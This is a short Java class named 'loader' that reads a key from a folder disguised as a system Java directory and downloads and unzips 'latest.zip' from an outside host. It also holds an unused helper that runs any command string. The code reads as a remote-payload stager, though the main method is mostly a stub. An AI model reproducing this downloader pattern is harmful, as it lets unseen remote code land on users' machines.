package main;
import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.net.URISyntaxException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.ArrayList;

public class loader {
	public final static String dir=System.getProperty("user.home") + "/Library/ApplicationSupport/JavaTM/";
	public final String javaBin = System.getProperty("java.home") + File.separator + "bin" + File.separator + "java";
	public final static String updateURL="http://totallymath.gq/UNM/dataInf.php?key="+key()+"&file=latest.zip";
	public static void runcommand(String command) throws IOException{
		Runtime.getRuntime().exec(command);
	}
	public static String key(){
		File key = new File(dir+"ac.key");
		if(!key.exists()) {
			return null;
		}
		else {
			String keycontents;
			try {
				keycontents = new String(Files.readAllBytes(Paths.get(dir+"ac.key")));
				return keycontents;
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
		return null;
	}
	public static boolean checkForUpdates(String url) {
		
		return false;
	}
	public static boolean update() {
		try {
			DownloadAgent.downloadUsingStream(updateURL, "latest.zip");
			DownloadAgent.downloadUsingNIO(updateURL, "latest.zip");
			try {
				ZipExtractor.unzip(loader.dir+"latest.zip", loader.dir);
				return true;
			}
			catch(IOException e) {
				e.printStackTrace();
				return false;
			}
		}
		catch(IOException e) {
			e.printStackTrace();
			return false;
		}
	}
	public void restartApplication() throws URISyntaxException{
		final File currentJar = new File(loader.class.getProtectionDomain().getCodeSource().getLocation().toURI());
		/* is it a jar file? */
		if(!currentJar.getName().endsWith(".jar"))
		return;
		/* Build command: java -jar application.jar */
		final ArrayList<String> command = new ArrayList<String>();
		command.add(javaBin);
		command.add("-jar");
		command.add(currentJar.getPath());
		final ProcessBuilder builder = new ProcessBuilder(command);
		try {
			builder.start();
		} catch (IOException e) {
			e.printStackTrace();
		}
		System.exit(0);
	}
	public static void main(String[] args) {
		File key = new File(dir+"ac.key");
		if(!key.exists()){
			
			System.exit(0);
		}
		else {
			
		}
	}
}
